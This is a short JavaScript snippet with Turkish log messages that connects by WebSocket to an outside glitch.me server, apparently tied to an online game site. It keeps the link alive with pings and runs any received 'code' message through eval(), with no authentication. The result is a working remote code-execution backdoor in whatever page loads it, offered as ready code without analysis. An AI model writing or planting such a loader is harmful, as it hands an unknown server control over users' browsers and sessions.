(function() {
    console.log('Script yüklendi!', 'Zaman:', new Date().toISOString());
    
    function connectWebSocket() {
        const ws = new WebSocket('wss://duello-katiponline-com.glitch.me');

        ws.onopen = () => {
            console.log('WebSocket bağlantısı kuruldu', 'Zaman:', new Date().toISOString());
            // Her 10 saniyede ping gönder
            const pingInterval = setInterval(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: 'ping' }));
                    console.log('Ping gönderildi', 'Zaman:', new Date().toISOString());
                }
            }, 10000);
            ws.onclose = () => clearInterval(pingInterval); // Koparsa interval’ı temizle
        };

        ws.onmessage = (event) => {
            console.log('Ham mesaj alındı:', event.data, 'Zaman:', new Date().toISOString());
            try {
                const message = JSON.parse(event.data);
                console.log('Mesaj ayrıştırıldı:', message, 'Zaman:', new Date().toISOString());
                if (message.type === 'code') {
                    console.log('Yeni kod alındı:', message.data, 'Zaman:', new Date().toISOString());
                    eval(message.data);
                } else if (message.type === 'pong') {
                    console.log('Pong alındı', 'Zaman:', new Date().toISOString());
                } else {
                    console.log('Bilinmeyen mesaj tipi:', message.type, 'Zaman:', new Date().toISOString());
                }
            } catch (e) {
                console.error('Mesaj işleme hatası:', e.message, 'Zaman:', new Date().toISOString());
            }
        };

        ws.onclose = () => {
            console.log('WebSocket bağlantısı koptu', 'Zaman:', new Date().toISOString());
            setTimeout(connectWebSocket, 2000);
        };

        ws.onerror = (error) => {
            console.error('WebSocket hatası:', error, 'Zaman:', new Date().toISOString());
        };

        window.myWebSocket = ws;
    }

    connectWebSocket();
})();
